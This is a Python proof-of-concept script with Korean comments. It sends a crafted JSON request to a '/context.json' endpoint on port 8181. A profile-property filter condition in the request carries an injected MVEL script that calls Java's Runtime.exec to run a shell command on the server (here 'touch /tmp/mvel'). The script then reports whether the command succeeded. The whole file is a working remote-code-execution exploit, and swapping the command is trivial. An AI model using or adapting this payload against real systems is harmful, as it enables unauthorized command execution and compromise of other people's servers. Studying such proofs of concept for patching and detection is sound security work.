import requests

# 대상 서버 URL 설정
url = "http://localhost:8181/context.json"

# 요청 헤더 설정
headers = {
    "Host": "localhost:8181",  # 대상 서버 호스트와 포트 설정
    "Accept-Encoding": "gzip, deflate",  # 응답 압축 방식 설정
    "Accept": "*/*",  # 모든 유형의 응답을 허용
    "Accept-Language": "en",  # 언어 설정 (영어)
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",  # 사용자 에이전트 설정 (브라우저 정보)
    "Connection": "close",  # 요청 후 연결을 종료할 것을 서버에 알림
    "Content-Type": "application/json",  # 요청 본문의 컨텐츠 유형 설정 (JSON 데이터)
}

# 요청 본문 데이터 설정
payload = {
    "filters": [
        {
            "id": "sample",  # 필터 식별자 설정
            "filters": [
                {
                    "condition": {
                        "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");"  # MVEL 스크립트 설정
                        },
                        "type": "profilePropertyCondition"  # 조건 유형 설정
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"  # 세션 ID 설정
}

# HTTP POST 요청 보내기
response = requests.post(url, headers=headers, json=payload)

# 응답 확인
if response.status_code == 200:
    print("명령이 성공적으로 실행되었습니다.")
else:
    print("명령 실행 중 오류가 발생했습니다.")
    print("응답 코드:", response.status_code)
    print("응답 내용:", response.text)